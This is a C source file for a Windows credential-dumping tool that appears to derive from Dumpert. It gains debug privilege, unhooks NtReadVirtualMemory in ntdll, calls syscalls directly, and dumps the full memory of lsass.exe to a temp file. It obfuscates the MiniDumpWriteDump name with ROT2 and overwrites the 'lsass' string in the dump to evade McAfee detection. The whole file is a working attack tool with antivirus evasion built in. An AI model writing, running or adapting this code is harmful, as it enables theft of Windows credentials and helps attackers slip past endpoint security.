#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <Windows.h>
#include <stdio.h>
#include "Dumpert.h"
#include <DbgHelp.h>

#pragma comment (lib, "Dbghelp.lib")


BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo) {
	BYTE AssemblyBytes[] = {0x4C, 0x8B, 0xD1, 0xB8, 0xFF};

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
	}
	else {
		return FALSE;
	}

	LPVOID lpProcAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), pWinVerInfo->lpApiCall);

	//printf("	[+] %s function pointer at: 0x%p\n", pWinVerInfo->lpApiCall, lpProcAddress);
	//printf("	[+] %s System call nr is: 0x%x\n", pWinVerInfo->lpApiCall, AssemblyBytes[4]);
	//printf("	[+] Unhooking %s.\n", pWinVerInfo->lpApiCall);

	LPVOID lpBaseAddress = lpProcAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = 10;
	NTSTATUS status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
		return FALSE;
	}
	
	status = ZwWriteVirtualMemory(GetCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
	if (status != STATUS_SUCCESS) {
		wprintf(L"	[!] ZwWriteVirtualMemory failed.\n");
		return FALSE;
	}

	status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
		return FALSE;
	}

	return TRUE;
}

BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo) {
	pWinVerInfo->hTargetPID = NULL;

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation10;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
		NtFreeVirtualMemory = &NtFreeVirtualMemory10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation7SP1;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory7SP1;
		NtFreeVirtualMemory = &NtFreeVirtualMemory7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation80;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory80;
		NtFreeVirtualMemory = &NtFreeVirtualMemory80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation81;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
		NtFreeVirtualMemory = &NtFreeVirtualMemory81;
	}
	else {
		return FALSE;
	}

	ULONG uReturnLength = 0;
	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, 0, 0, &uReturnLength);
	if (!status == 0xc0000004) {
		return FALSE;
	}

	LPVOID pBuffer = NULL;
	SIZE_T uSize = uReturnLength;
	status = NtAllocateVirtualMemory(GetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
	if (status != 0) {
		return FALSE;
	}

	status = ZwQuerySystemInformation(SystemProcessInformation, pBuffer, uReturnLength, &uReturnLength);
	if (status != 0) {
		return FALSE;
	}

	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEqualUnicodeString");
	if (RtlEqualUnicodeString == NULL) {
		return FALSE;
	}

	PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES)pBuffer;
	do {
		if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &pWinVerInfo->ProcName, TRUE)) {
			pWinVerInfo->hTargetPID = pProcInfo->ProcessId;
			break;
		}
		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);

	} while (pProcInfo);

	status = NtFreeVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);

	if (pWinVerInfo->hTargetPID == NULL) {
		return FALSE;
	}

	return TRUE;
}

BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPWSTR lpwPriv = L"SeDebugPrivilege";
	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

char* find_str_in_data(const char* str, const char* data, int length){
	int pos = 0;
	int slen = strlen(str);
	int datalen = strlen(data);
	int diff = length - slen;

	int i = 0;
	while (pos < (length - slen)){
		pos++;
		i = 0;

		while (i < slen && str[i] == data[pos + i]){
			i++;
		}
		if (i == slen) {
			return data + pos;
		}
	}
	return NULL;
}

char* MyRot(char* input, int key) {
	char* output;
	output = malloc(strlen(input) * sizeof(char));
	int keysave = key;
	for (int n = 0, len = strlen(input); n < len; n++){
		int currentLetter = input[n];
		char cipher = currentLetter + key;

		if ((currentLetter - 'a') + key > 26){
			key = ((currentLetter - 'a') + key) % 26;
			cipher = 'a' + key;
		}
		output[n] = cipher;
		key = keysave;
	}
	return output;
}

int wmain(int argc, wchar_t* argv[]) {
	LPCWSTR lpwProcName = L"lsass.exe";

	if (sizeof(LPVOID) != 8) {
		wprintf(L"[!] Sorry, this tool only works on a x64 version of Windows.\n");
		exit(1);
	}

	if (!IsElevated()) {
		wprintf(L"[!] You need elevated privileges to run this tool!\n");
		exit(1);
	}

	SetDebugPrivilege();

	PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));

	// First set OS Version/Architecture specific values
	OSVERSIONINFOEXW osInfo;
	LPWSTR lpOSVersion;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
	if (RtlGetVersion == NULL) {
		return FALSE;
	}

//	wprintf(L"[1] Checking OS version details:\n");
	RtlGetVersion(&osInfo);
	swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
	pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;

	// Now create os/build specific syscall function pointers.
	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		lpOSVersion = L"10 or Server 2016";
		//wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		//wprintf(L"	[+] Mapping version specific System calls.\n");
		ZwOpenProcess = &ZwOpenProcess10;
		NtCreateFile = &NtCreateFile10;
		ZwClose = &ZwClose10;
		pWinVerInfo->SystemCall = 0x3F;
		//FBK
		NtReadFile = &NtReadFile10;
		NtWriteFile = &NtWriteFile10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
		lpOSVersion = L"7 SP1 or Server 2008 R2";
		//wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		//wprintf(L"	[+] Mapping version specific System calls.\n");
		ZwOpenProcess = &ZwOpenProcess7SP1;
		NtCreateFile = &NtCreateFile7SP1;
		ZwClose = &ZwClose7SP1;
		pWinVerInfo->SystemCall = 0x3C;
		//FBK
		NtReadFile = &NtReadFile7SP1;
		NtWriteFile = &NtWriteFile7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		lpOSVersion = L"8 or Server 2012";
		//wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		//wprintf(L"	[+] Mapping version specific System calls.\n");
		ZwOpenProcess = &ZwOpenProcess80;
		NtCreateFile = &NtCreateFile80;
		ZwClose = &ZwClose80;
		pWinVerInfo->SystemCall = 0x3D;
		//FBK
		NtReadFile = &NtReadFile80;
		NtWriteFile = &NtWriteFile80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		lpOSVersion = L"8.1 or Server 2012 R2";
		//wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
		//wprintf(L"	[+] Mapping version specific System calls.\n");
		ZwOpenProcess = &ZwOpenProcess81;
		NtCreateFile = &NtCreateFile81;
		ZwClose = &ZwClose81;
		pWinVerInfo->SystemCall = 0x3E;
		//FBK
		NtReadFile = &NtReadFile81;
		NtWriteFile = &NtWriteFile81;
	}
	else {
		wprintf(L"	[!] OS Version not support3d.\n\n");
		exit(1);
	}

	//wprintf(L"[2] Checking Process details:\n");

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	RtlInitUnicodeString(&pWinVerInfo->ProcName, lpwProcName);

	if (!GetPID(pWinVerInfo)) {
		wprintf(L"[!] Enum3rating proc3ss failed.\n");
		exit(1);
	}

	wprintf(L"[+] Proc3ss ID of %wZ is: %lld\n", pWinVerInfo->ProcName, (ULONG64)pWinVerInfo->hTargetPID);
	pWinVerInfo->lpApiCall = "NtReadVirtualMemory";

	if (!Unhook_NativeAPI(pWinVerInfo)) {
		printf("[!] Unh00king %s fail3d.\n", pWinVerInfo->lpApiCall);
		exit(1);
	}

	//wprintf(L"[3] Create memorydump file:\n");

	//wprintf(L"	[+] Open a process handle.\n");
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID uPid = { 0 };

	uPid.UniqueProcess = pWinVerInfo->hTargetPID;
	uPid.UniqueThread = (HANDLE)0;

	NTSTATUS status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
	if (hProcess == NULL) {
		wprintf(L"[!] Fail3d to g3t processhandle.\n");
		exit(1);
	}

	WCHAR chDmpFile[MAX_PATH] = L"\\??\\";
	WCHAR chWinPath[MAX_PATH];
	GetWindowsDirectory(chWinPath, MAX_PATH);
	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\dump.bin");

	UNICODE_STRING uFileName;
	RtlInitUnicodeString(&uFileName, chDmpFile);

	wprintf(L"[+] Dump %wZ to: %wZ\n", pWinVerInfo->ProcName, uFileName);
	
	HANDLE hDmpFile = NULL;
	IO_STATUS_BLOCK IoStatusBlock;
	ZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
	OBJECT_ATTRIBUTES FileObjectAttributes;
	InitializeObjectAttributes(&FileObjectAttributes, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	//  Open input file for writing, overwrite existing file.
	status = NtCreateFile(&hDmpFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0,
		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	if (hDmpFile == INVALID_HANDLE_VALUE) {
		wprintf(L"[!] Fail3d to create file.\n");
		ZwClose(hProcess);
		exit(1);
	}

	DWORD dwTargetPID = GetProcessId(hProcess);

	typedef BOOL(WINAPI* mafonction) (_In_ HANDLE hProcess, _In_ DWORD ProcessId, _In_ HANDLE hFile, _In_ MINIDUMP_TYPE DumpType, _In_opt_ PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
		_In_opt_ PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, _In_opt_ PMINIDUMP_CALLBACK_INFORMATION CallbackParam);
	HINSTANCE lib_handle;
	lib_handle = LoadLibrary(TEXT("dbghelp.dll"));
	mafonction mydumpfonction = (mafonction)GetProcAddress(lib_handle, MyRot("KglgBsknUpgrcBskn", 2)); //MiniDumpWriteDump with ROT2
	if (!mydumpfonction) {
		wprintf(L"[!] Wr0ng Return of Address\n");
		exit(1);
	}
	BOOL Success = mydumpfonction(hProcess, dwTargetPID, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	/*
	BOOL Success = MiniDumpWriteDump(hProcess,
		dwTargetPID,
		hDmpFile,
		MiniDumpWithFullMemory,
		NULL,
		NULL,
		NULL);
*/
	if ((!Success)) {
		wprintf(L"[!] Failed, error code: %x\n", GetLastError());
		ZwClose(hProcess);
		exit(1);
	}
	else {
		wprintf(L"[+] Writing fIle succesful.\n");
	}
		
	const ULONG readSize = 2048;
	//Sleep(1000);
	LARGE_INTEGER      byteOffset;
	unsigned char szBuffer[2048];
	char* s;
	BOOL found = FALSE;
	char McAfeeString[] = { 'l', 's', 'a', 's', 's' };
	ZeroMemory(&szBuffer, readSize);
	wprintf(L"[+] Patching fIle\n");
	byteOffset.LowPart = byteOffset.HighPart = 0;
	while (!found) {
		status = NtReadFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
		if (status == STATUS_SUCCESS) {
			s = find_str_in_data(McAfeeString, szBuffer, readSize);
			if ((s != NULL) || (byteOffset.LowPart >= 40000)) {
				found = TRUE;
				szBuffer[s - szBuffer] = 'x';
				szBuffer[s - szBuffer + 1] = 'x';
				szBuffer[s - szBuffer + 2] = 'x';
				szBuffer[s - szBuffer + 3] = 'x';
				szBuffer[s - szBuffer + 4] = 'x';
				wprintf(L"[+] Patch address %08X\n", s - szBuffer + byteOffset.LowPart);
				status = NtWriteFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
			}
			byteOffset.LowPart += readSize;
		}
		else {
			wprintf(L"[-] Failed to patch fIle. - %X\n", status);
			wprintf(L"[!] Err0r: %x\n", GetLastError());
			ZwClose(hProcess);
			exit(1);
		}
	}

	ZwClose(hDmpFile);
	ZwClose(hProcess);

	return 0;
}